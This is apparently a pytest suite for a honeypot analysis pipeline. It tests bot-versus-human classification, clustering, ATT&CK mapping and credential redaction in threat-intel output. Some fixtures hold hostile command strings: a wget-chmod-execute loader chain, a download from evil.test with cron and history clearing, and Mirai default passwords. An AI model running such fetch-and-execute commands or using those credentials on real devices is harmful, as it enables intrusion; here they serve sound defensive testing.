"""Pipeline tests.

Two kinds. Synthetic tests assert behaviour against constructed sessions with
known ground truth. Corpus tests run against a real end-to-end capture when one
is present, and are skipped otherwise so the suite stays runnable on a machine
that has never executed the harness.
"""

from __future__ import annotations

import json
from pathlib import Path

import pytest

from honeynet_ml.attack import map_cluster, map_session
from honeynet_ml.cluster import cluster_sessions, derive_label, summarize_cluster
from honeynet_ml.corpus import Command, Credential, Artifact, Session, fold_sessions
from honeynet_ml.features import extract_behavioural, is_automated, wordlist_affinity
from honeynet_ml.intel import build_intel, extract_iocs, _password_shape

CORPUS = Path(__file__).resolve().parents[2] / ".e2e" / "events.jsonl"
requires_corpus = pytest.mark.skipif(
    not CORPUS.exists(), reason="run scripts/e2e.ps1 -KeepArtifacts to generate the corpus"
)


# --------------------------------------------------------------- helpers ----


def scripted_session(sid: str = "S-BOT", n: int = 6) -> Session:
    """A loader: bulk input, no PTY, metronomic timing."""
    return Session(
        session_id=sid,
        node_id="n1",
        protocol="ssh",
        src_ip="203.0.113.5",
        client_banner="SSH-2.0-libssh2_1.4.3",
        hassh="a" * 32,
        commands=[
            Command(
                raw=f"cmd{i}",
                argv=[f"cmd{i}"],
                cwd="/tmp",
                since_session_start_ms=i * 100,
                since_previous_ms=100,
                keystroke_deltas_ms=[],
                bulk_input=True,
                index=i,
            )
            for i in range(n)
        ],
        credentials=[
            Credential("root", "xc3511", "password", False, 0, 50),
            Credential("root", "vizxv", "password", True, 1, 50),
        ],
        duration_ms=n * 100,
        complete=True,
    )


def human_session(sid: str = "S-HUMAN", n: int = 6) -> Session:
    """An operator: PTY, irregular keystrokes, multi-second thinking pauses."""
    return Session(
        session_id=sid,
        node_id="n1",
        protocol="ssh",
        src_ip="198.51.100.20",
        client_banner="SSH-2.0-OpenSSH_9.6",
        hassh="b" * 32,
        commands=[
            Command(
                raw=f"command number {i}",
                argv=["command"],
                cwd="/root",
                since_session_start_ms=i * 4000,
                since_previous_ms=4000,
                # Irregular, human-scale gaps.
                keystroke_deltas_ms=[900, 130, 88, 210, 95, 340, 120, 76],
                bulk_input=False,
                index=i,
            )
            for i in range(n)
        ],
        credentials=[
            Credential("root", "admin", "password", False, 0, 3000),
            Credential("root", "root", "password", True, 1, 4200),
        ],
        duration_ms=n * 4000,
        complete=True,
    )


def scanner_session(sid: str = "S-SCAN") -> Session:
    """Credential harvesting with no commands at all."""
    return Session(
        session_id=sid,
        node_id="n1",
        protocol="ssh",
        src_ip="192.0.2.77",
        client_banner="SSH-2.0-Go",
        hassh="c" * 32,
        commands=[],
        credentials=[
            Credential("root", "123456", "password", False, i, 40)
            for i in range(5)
        ]
        + [Credential("root", "admin", "password", True, 5, 40)],
        duration_ms=300,
        complete=True,
    )


# ------------------------------------------------------------ classifier ----


def test_scripted_session_is_automated():
    automated, confidence = is_automated(extract_behavioural(scripted_session()))
    assert automated
    assert confidence > 0.8


def test_human_session_is_interactive():
    automated, confidence = is_automated(extract_behavioural(human_session()))
    assert not automated
    assert confidence < 0.3


def test_command_free_scanner_is_automated():
    """A session with no commands offers no input-shape evidence.

    Weighting that absence as evidence against automation misclassified every
    credential scanner, which is the most purely automated behaviour there is.
    """
    automated, confidence = is_automated(extract_behavioural(scanner_session()))
    assert automated, "credential scanner must not be classified as interactive"
    assert confidence > 0.8


def test_bare_connection_is_unknown():
    empty = Session(session_id="S-EMPTY", node_id="n1")
    automated, confidence = is_automated(extract_behavioural(empty))
    assert not automated
    assert confidence == 0.5


def test_timing_features_separate_the_two():
    bot = extract_behavioural(scripted_session())
    human = extract_behavioural(human_session())

    assert bot.bulk_ratio == 1.0
    assert human.bulk_ratio == 0.0
    assert bot.keystroke_coverage == 0.0
    assert human.keystroke_coverage == 1.0
    assert human.gap_mean_ms > bot.gap_mean_ms * 10


# --------------------------------------------------------------- corpus ----


def test_fold_groups_events_by_session():
    events = [
        {
            "node_id": "n1",
            "seq": 1,
            "session_id": "A",
            "ts_collector": "2026-07-25T10:00:00Z",
            "payload": {"kind": "session_start", "protocol": "ssh", "peer": {"src_ip": "1.2.3.4"}},
        },
        {
            "node_id": "n1",
            "seq": 2,
            "session_id": "A",
            "ts_collector": "2026-07-25T10:00:01Z",
            "payload": {"kind": "command", "raw": "id", "argv": ["id"]},
        },
        {
            "node_id": "n1",
            "seq": 3,
            "session_id": "",
            "ts_collector": "2026-07-25T10:00:02Z",
            "payload": {"kind": "heartbeat", "spool_depth": 0},
        },
    ]
    sessions = fold_sessions(events)
    assert len(sessions) == 1, "node-level heartbeats must not create a session"
    assert sessions[0].session_id == "A"
    assert sessions[0].src_ip == "1.2.3.4"
    assert sessions[0].command_count == 1


def test_incomplete_session_gets_a_derived_duration():
    """A session missing its terminal event must not look instantaneous."""
    events = [
        {
            "node_id": "n1",
            "seq": 1,
            "session_id": "B",
            "ts_collector": "2026-07-25T10:00:00Z",
            "payload": {"kind": "command", "raw": "id", "argv": ["id"],
                        "since_session_start_ms": 5000},
        }
    ]
    s = fold_sessions(events)[0]
    assert not s.complete
    assert s.duration_ms == 5000


# ------------------------------------------------------------ clustering ----


def test_clustering_separates_families():
    sessions = (
        [scripted_session(f"BOT{i}") for i in range(4)]
        + [human_session(f"HUM{i}") for i in range(4)]
        + [scanner_session(f"SCAN{i}") for i in range(4)]
    )
    result = cluster_sessions(sessions, min_cluster_size=2)

    assert result.n_clusters >= 2

    # Members of one family must not be split across clusters.
    for prefix in ("BOT", "HUM", "SCAN"):
        labels = {
            int(l)
            for s, l in zip(sessions, result.labels)
            if s.session_id.startswith(prefix) and l != -1
        }
        assert len(labels) <= 1, f"{prefix} sessions split across clusters {labels}"


def test_label_reads_tools_from_raw_text():
    """Sensors record argv for the leading stage only.

    A chain like `cd /tmp; wget ...` reports its tool as `cd`, so label
    derivation must read the raw command line or it misses the fetch.
    """
    profile = summarize_cluster(0, [])
    profile.size = 2
    profile.automated_fraction = 1.0
    profile.mean_command_count = 4
    profile.top_commands = [
        ("/bin/busybox ECCHI", 2),
        ("cd /tmp; wget http://1.2.3.4/x -O y; chmod 777 y; ./y", 2),
    ]
    profile.top_tools = [("busybox", 2), ("cd", 2)]  # wget absent from argv
    assert derive_label(profile) == "iot-loader"


# ---------------------------------------------------------------- attack ----


def test_attack_mapping_finds_expected_techniques():
    s = scripted_session()
    s.commands = [
        Command("wget http://evil.test/x.sh", ["wget"], "/tmp", 0, 0, [], True, 0),
        Command("chmod +x x.sh", ["chmod"], "/tmp", 100, 100, [], True, 1),
        Command("crontab -l", ["crontab"], "/tmp", 200, 100, [], True, 2),
        Command("history -c", ["history"], "/tmp", 300, 100, [], True, 3),
    ]
    s.artifacts = [Artifact("http://evil.test/x.sh", "http", "evil.test", 80, "/x.sh", "wget")]

    ids = {h.technique.id for h in map_session(s)}
    assert "T1105" in ids, "ingress tool transfer"
    assert "T1222.002" in ids, "permission modification"
    assert "T1053.003" in ids, "cron persistence"
    assert "T1070.003" in ids, "history clearing"
    assert "T1078" in ids, "valid accounts (successful credential)"


def test_brute_force_requires_repeated_failures():
    s = scripted_session()
    s.credentials = [Credential("root", "a", "password", True, 0, 10)]
    assert "T1110.001" not in {h.technique.id for h in map_session(s)}

    s.credentials = [
        Credential("root", "a", "password", False, 0, 10),
        Credential("root", "b", "password", False, 1, 10),
        Credential("root", "c", "password", True, 2, 10),
    ]
    assert "T1110.001" in {h.technique.id for h in map_session(s)}


def test_cluster_prevalence_is_a_fraction():
    members = [scripted_session(f"B{i}") for i in range(4)]
    members[0].artifacts = [Artifact("http://a/b", "http", "a", 80, "/b", "wget")]
    result = map_cluster(members)
    t1105 = next(t for t in result["techniques"] if t["technique_id"] == "T1105")
    assert t1105["prevalence"] == 0.25


# ----------------------------------------------------------------- intel ----


def test_password_shape_hides_the_password():
    assert _password_shape("xc3511") == "aadddd"
    assert _password_shape("P@ssw0rd") == "Asaaadaa"
    assert _password_shape("") == "(empty)"
    # The shape must not contain the original characters.
    assert "xc3511" not in _password_shape("xc3511")
    # Distinct passwords sharing a structure collapse to one shape, which is
    # what makes the published pattern non-identifying.
    assert _password_shape("vizxv") == _password_shape("admin")


def test_spray_only_addresses_are_not_published():
    """Credential-spray-only sources are excluded from the feed.

    They are overwhelmingly shared infrastructure and compromised third-party
    hosts; publishing them generates false positives for consumers.
    """
    scanner = scanner_session()
    result = cluster_sessions([scanner, scanner_session("S2")], min_cluster_size=2)
    bundle = build_intel([scanner], result)

    patterns = [o["pattern"] for o in bundle["objects"] if o["type"] == "indicator"]
    assert not any("192.0.2.77" in p for p in patterns)


def test_payload_dropping_address_is_published():
    s = scripted_session()
    s.artifacts = [Artifact("http://198.18.0.9/p", "http", "198.18.0.9", 80, "/p", "wget")]
    result = cluster_sessions([s, scripted_session("B2")], min_cluster_size=2)
    bundle = build_intel([s], result)

    patterns = " ".join(o["pattern"] for o in bundle["objects"] if o["type"] == "indicator")
    assert "203.0.113.5" in patterns, "source that dropped a payload must be published"
    assert "198.18.0.9" in patterns, "payload host must be published"


def test_bundle_never_leaks_raw_credentials():
    """The publish boundary from design doc section 9.

    Real users occasionally typo a real password into a fake prompt, so the
    feed carries shapes and hashes, never the harvested pairs.
    """
    sessions = [scripted_session(f"B{i}") for i in range(3)]
    for s in sessions:
        s.artifacts = [Artifact("http://198.18.0.9/p", "http", "198.18.0.9", 80, "/p", "wget")]
    result = cluster_sessions(sessions, min_cluster_size=2)
    bundle = build_intel(sessions, result, redact_credentials=True)

    raw = json.dumps(bundle)
    for secret in ("xc3511", "vizxv"):
        assert secret not in raw, f"credential {secret!r} leaked into the published bundle"


def test_bundle_is_deterministic():
    """Re-running over the same corpus must not duplicate objects in a TAXII
    consumer's store."""
    sessions = [scripted_session(f"B{i}") for i in range(3)]
    result = cluster_sessions(sessions, min_cluster_size=2)

    a = build_intel(sessions, result)
    b = build_intel(sessions, result)
    assert [o["id"] for o in a["objects"]] == [o["id"] for o in b["objects"]]


def test_wordlist_affinity_identifies_the_list():
    s = scripted_session()
    s.credentials = [
        Credential("root", p, "password", False, i, 10)
        for i, p in enumerate(["xc3511", "vizxv", "juantech", "anko"])
    ]
    affinity = wordlist_affinity(s)
    assert affinity["mirai_default"] > affinity["top10_common"]


# -------------------------------------------------------- real corpus ----


@requires_corpus
def test_real_corpus_classification_matches_ground_truth():
    """The simulator's profiles are known, so classification can be scored.

    Two of the six profiles are interactive by construction; the rest are
    scripted. Any drift here means the classifier regressed.
    """
    from honeynet_ml.corpus import load_corpus

    sessions = load_corpus(CORPUS)
    assert sessions, "corpus is empty"

    interactive = [
        s for s in sessions if not is_automated(extract_behavioural(s))[0]
    ]
    # Only the human-operator profile uses OpenSSH_9.6 with a PTY.
    assert all("OpenSSH" in s.client_banner for s in interactive), (
        "a scripted session was classified interactive: "
        f"{[s.client_banner for s in interactive]}"
    )
    assert len(interactive) >= 1, "the human operator sessions were not detected"


@requires_corpus
def test_real_corpus_clusters_by_family():
    """Each simulated family uses a distinct SSH library, so its HASSH is
    distinct. A correct clustering never mixes two HASSH values in one group.
    """
    from honeynet_ml.corpus import load_corpus

    sessions = load_corpus(CORPUS)
    result = cluster_sessions(sessions, min_cluster_size=2)

    assert result.n_clusters >= 4, f"only {result.n_clusters} clusters recovered"
    for profile in result.profiles:
        assert len(profile.hasshes) <= 1, (
            f"cluster {profile.cluster_id} mixes client fingerprints: {profile.hasshes}"
        )
